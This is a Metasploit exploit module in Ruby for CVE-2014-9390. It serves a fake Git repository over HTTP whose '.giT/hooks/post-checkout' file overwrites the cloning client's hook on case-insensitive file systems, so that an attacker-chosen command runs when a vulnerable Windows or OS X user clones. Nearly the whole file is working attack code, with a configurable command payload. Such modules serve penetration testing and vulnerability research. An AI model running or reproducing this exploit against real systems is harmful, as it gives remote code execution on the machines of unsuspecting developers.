##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'Malicious Git HTTP Server For CVE-2014-9390',
      'Description' => %q(
        This module exploits CVE-2014-9390, which affects Git versions less
        than 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1 on operating systems which
        have case-insensitive file systems like Windows and OS X.  Because the
        file system is case-insensitive, sensitive files in the .git directory
        can be overwritten by other files which live in a server-side .git
        directory which only differs in case (for example, .giT).  This results
        in all manner of potential consequences, including remote code
        execution.
      ),
      'License' => MSF_LICENSE,
      'Author' => [
        'Jon Hart <jon_hart[at]rapid7.com>' # metasploit module
      ],
      'References'     =>
        [
          ['CVE', '2014-9390'],
          ['URL', 'http://git-blame.blogspot.com.es/2014/12/git-1856-195-205-214-and-221-and.html']
        ],
      'DisclosureDate' => 'Dec 18 2014',
      # TODO: correct all of this
      'Payload'        =>
        {
          'BadChars' => "\x00",
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl ruby bash telnet'
            }
        },
      'Platform'	=> %w(osx win),
      'Targets'	=>
        [
          [
            'Automatic',
            {
              'Platform' => [ 'unix' ],
              'Arch'     => ARCH_CMD
            }
          ]
        ],
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('CMD', [true, 'The command to run', 'id > /tmp/id']),
        OptString.new('URIPATH', [true, 'The URI to use as the malicious Git instance', '/git-got'])
      ])
  end

  def setup
    # This builds a fake git repository using the knowledge from:
    # http://schacon.github.io/gitbook/7_how_git_stores_objects.html
    # http://schacon.github.io/gitbook/7_browsing_git_objects.html
    #
    # It creates a .giT/hooks/post-checkout file that contains a command to
    # execute.  Because the full path of this file will be considered identical
    # on case-insensitive filesystems and will be use in place of .git/hooks/post-checkout
    # and will subsequently execute commands of our choosing upon cloning
    @file_paths = {}
    # build the post-update file blob
    full_cmd = "#!/bin/sh\n#{datastore['CMD']}"
    sha1, content = build_object('blob', full_cmd)
    @file_paths["/objects/#{get_path(sha1)}"] = content
    # build tree that points to the blob
    sha1, content = build_object('tree', "100755 post-checkout\0#{[sha1].pack('H*')}")
    @file_paths["/objects/#{get_path(sha1)}"] = content
    # build a tree that points to the hooks directory in which post-update lives
    sha1, content = build_object('tree', "40000 hooks\0#{[sha1].pack('H*')}")
    @file_paths["/objects/#{get_path(sha1)}"] = content
    # build a tree that points to the .giT directory in which hooks lives
    sha1, content = build_object('tree', "40000 .giT\0#{[sha1].pack('H*')}")
    @file_paths["/objects/#{get_path(sha1)}"] = content
    # build the supposed commit that dropped this file
    user = rand_text_alphanumeric(3 + rand(10))
    tstamp = Time.now.to_i
    commit = "author #{user} <#{user}@example.com> #{tstamp} -0800\n" \
             "committer #{user} <#{user}@example.com> #{tstamp} -0800\n" \
             "\n" \
             "test\n"
    commit_content = "tree #{sha1}\n#{commit}"
    sha1, content = build_object('commit', commit_content)
    @file_paths["/objects/#{get_path(sha1)}"] = content
    # build HEAD
    @file_paths['/HEAD'] = "ref: refs/heads/master\n"
    # lastly, build refs
    @file_paths['/info/refs'] = "#{sha1}\trefs/heads/master\n"
  end

  def build_object(type, content)
    header = "#{type} #{content.size}\0"
    store = header + content
    [Digest::SHA1.hexdigest(store), Zlib::Deflate.deflate(store)]
  end

  def get_path(sha1)
    sha1[0...2] + '/' + sha1[2..40]
  end

  def exploit
    super
  end

  def on_request_uri(cli, req)
    # determine if the requested file is something we know how to serve from our
    # fake repository and send it if so
    req_file = URI.parse(req.uri).path.gsub(/^#{datastore['URIPATH']}/, '')
    if @file_paths.key?(req_file)
      send_response(cli, @file_paths[req_file])
    else
      vprint_status("#{req_file} doesn't exist")
      send_not_found(cli)
    end
  end
end
